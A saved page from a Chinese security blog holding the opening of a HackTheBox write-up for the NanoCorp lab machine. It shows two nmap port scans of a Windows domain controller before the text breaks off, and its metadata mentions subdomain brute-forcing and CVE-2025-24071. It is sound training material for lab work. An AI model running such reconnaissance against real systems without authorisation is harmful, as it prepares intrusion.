<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">HackTheBox - Season9 - NanoCorp | Sunset Blog</title><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Season9 NanoCorp https://app.hackthebox.com/machines/NanoCorp Recon PortScan 枚举 80 端口 目录扫描 主站是看着没有什么的，尝试一下爆一下子域名 换个字典，爆破到存在 hire 子域名 CVE 2025 24071 将..." data-next-head=""/><meta property="og:title" content="HackTheBox - Season9 - NanoCorp | Sunset Blog" data-next-head=""/><meta property="og:description" content="Season9 NanoCorp https://app.hackthebox.com/machines/NanoCorp Recon PortScan 枚举 80 端口 目录扫描 主站是看着没有什么的，尝试一下爆一下子域名 换个字典，爆破到存在 hire 子域名 CVE 2025 24071 将..." data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top/2025/11/14/HackTheBoxSeason9 - NanoCorp" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-11-14" data-next-head=""/><meta property="article:modified_time" content="2025-11-14" data-next-head=""/><meta property="article:author" content="Sunset" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="HackTheBox" data-next-head=""/><meta property="article:tag" content="Windows" data-next-head=""/><meta property="article:tag" content="CVE-2025-24071" data-next-head=""/><meta property="article:tag" content="CVE-2024-0670" data-next-head=""/><meta property="article:tag" content="encrypt" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackTheBox - Season9 - NanoCorp" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top/2025/11/14/HackTheBoxSeason9 - NanoCorp" data-next-head=""/><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><link rel="preload" href="/_next/static/css/f055e431c58b907b.css" as="style"/><script type="application/ld+json" data-next-head="">{"@context":"https://schema.org","@type":"BlogPosting","datePublished":"2025-11-14","description":"Season9 NanoCorp https://app.hackthebox.com/machines/NanoCorp Recon PortScan 枚举 80 端口 目录扫描 主站是看着没有什么的，尝试一下爆一下子域名 换个字典，爆破到存在 hire 子域名 CVE 2025 24071 将...","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.sunsetaction.top/2025/11/14/HackTheBoxSeason9 - NanoCorp"},"headline":"HackTheBox - Season9 - NanoCorp","image":["https://www.sunsetaction.top/images/logo.png"],"dateModified":"2025-11-14","author":{"@type":"Person","name":"Sunset"},"publisher":{"@type":"Organization","name":"Sunset Blog","logo":{"@type":"ImageObject","url":"https://www.sunsetaction.top/images/logo.png"}}}</script><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><link rel="stylesheet" href="/_next/static/css/f055e431c58b907b.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-4c7ff0ae52612d94.js" defer=""></script><script src="/_next/static/fZfIvGZ7IygHEm6klVvEz/_buildManifest.js" defer=""></script><script src="/_next/static/fZfIvGZ7IygHEm6klVvEz/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]" style="opacity:0;transform:translateY(20px)"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400" style="opacity:0;transform:translateX(-20px)">HackTheBox - Season9 - NanoCorp</h1><div class="flex flex-col" style="opacity:0"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-11-14</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-11-14<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><a href="/tag/HackTheBox/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">HackTheBox</span></a><a href="/tag/Windows/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">Windows</span></a><a href="/tag/CVE-2025-24071/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">CVE-2025-24071</span></a><a href="/tag/CVE-2024-0670/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">CVE-2024-0670</span></a><a href="/tag/encrypt/"><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300 cursor-pointer hover:bg-red-700 hover:text-white transition-colors">encrypt</span></a></div></div><div style="opacity:0;transform:translateY(10px)"><div class="my-8 text-center"><div class="flex flex-col items-center gap-3"><div class="w-8 h-8 border-4 border-red-700 dark:border-red-400 border-t-transparent rounded-full animate-spin"></div><p class="text-gray-500 dark:text-gray-400 text-sm">加载中...</p></div></div></div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxSeason9 - NanoCorp","contentHtml":"\u003ch1\u003eSeason9 - NanoCorp\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/NanoCorp\"\u003ehttps://app.hackthebox.com/machines/NanoCorp\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason9%20-%20NanoCorp/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ nmap -sT -\u003cspan class=\"hljs-built_in\"\u003emin\u003c/span\u003e-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e   \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.95\u003c/span\u003e ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.048\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65515\u003c/span\u003e filtered tcp ports (no-response)\nPORT      STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e/tcp    \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  domain\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp    \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e/tcp    \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kerberos-sec\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  msrpc\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e389\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldap\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  microsoft-ds\n\u003cspan class=\"hljs-number\"\u003e464\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kpasswd5\n\u003cspan class=\"hljs-number\"\u003e593\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http-rpc-epmap\n\u003cspan class=\"hljs-number\"\u003e636\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldapssl\n\u003cspan class=\"hljs-number\"\u003e3268\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  globalcatLDAP\n\u003cspan class=\"hljs-number\"\u003e3269\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  globalcatLDAPssl\n\u003cspan class=\"hljs-number\"\u003e5986\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  wsmans\n\u003cspan class=\"hljs-number\"\u003e9389\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  adws\n\u003cspan class=\"hljs-number\"\u003e49664\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  unknown\n\u003cspan class=\"hljs-number\"\u003e49668\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  unknown\n\u003cspan class=\"hljs-number\"\u003e57330\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  unknown\n\u003cspan class=\"hljs-number\"\u003e57335\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  unknown\n\u003cspan class=\"hljs-number\"\u003e57361\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  unknown\n\u003cspan class=\"hljs-number\"\u003e65042\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  unknown\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e➜ nmap -sT -A -p $(cat port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | paste -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.95\u003c/span\u003e ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e CST\nStats: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:01:07 elapsed; \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e hosts completed (\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e up), \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e undergoing Script Scan\nNSE Timing: About \u003cspan class=\"hljs-number\"\u003e91.96\u003c/span\u003e% done; ETC: \u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e remaining)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.55\u003c/span\u003es latency).\n\nPORT     STATE SERVICE       VERSION\n\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  domain        Simple DNS Plus\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http          Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.58\u003c/span\u003e (OpenSSL/\u003cspan class=\"hljs-number\"\u003e3.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e PHP/\u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e)\n|_http-server-header: Apache/\u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.58\u003c/span\u003e (Win64) OpenSSL/\u003cspan class=\"hljs-number\"\u003e3.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e PHP/\u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\n|_http-title: Did \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e follow redirect to http://nanocorp.htb/\n\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kerberos-sec  Microsoft Windows Kerberos (server time: \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e:55Z)\n\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  msrpc         Microsoft Windows RPC\n\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  netbios-ssn   Microsoft Windows netbios-ssn\n\u003cspan class=\"hljs-number\"\u003e389\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)\n\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  microsoft-ds?\n\u003cspan class=\"hljs-number\"\u003e464\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  kpasswd5?\n\u003cspan class=\"hljs-number\"\u003e593\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ncacn_http    Microsoft Windows RPC over HTTP \u003cspan class=\"hljs-number\"\u003e1.0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e636\u003c/span\u003e/tcp  \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  tcpwrapped\n\u003cspan class=\"hljs-number\"\u003e3268\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ldap          Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)\n\u003cspan class=\"hljs-number\"\u003e3269\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  tcpwrapped\n\u003cspan class=\"hljs-number\"\u003e5986\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssl/http      Microsoft HTTPAPI httpd \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e (SSDP/UPnP)\n| ssl-cert: Subject: commonName=dc01.nanocorp.htb\n| Subject Alternative Name: DNS:dc01.nanocorp.htb\n| Not valid before: \u003cspan class=\"hljs-number\"\u003e2025\u003c/span\u003e-04-06T22:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e\n|_Not valid after:  \u003cspan class=\"hljs-number\"\u003e2026\u003c/span\u003e-04-06T23:\u003cspan class=\"hljs-number\"\u003e18\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e43\u003c/span\u003e\n| tls-alpn:\n|_  http/\u003cspan class=\"hljs-number\"\u003e1.1\u003c/span\u003e\n|_ssl-date: TLS randomness does \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e represent time\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/\u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e9389\u003c/span\u003e/tcp \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  mc-nmf        .NET Message Framing\nWarning: OSScan results may be unreliable because we could \u003cspan class=\"hljs-keyword\"\u003enot\u003c/span\u003e find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning (JUST GUESSING): Microsoft Windows \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e|\u003cspan class=\"hljs-number\"\u003e2016\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e89\u003c/span\u003e%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016\nAggressive OS guesses: Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2022\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e89\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e R2 (\u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e%), Microsoft Windows Server \u003cspan class=\"hljs-number\"\u003e2016\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e%)\nNo exact OS matches \u003cspan 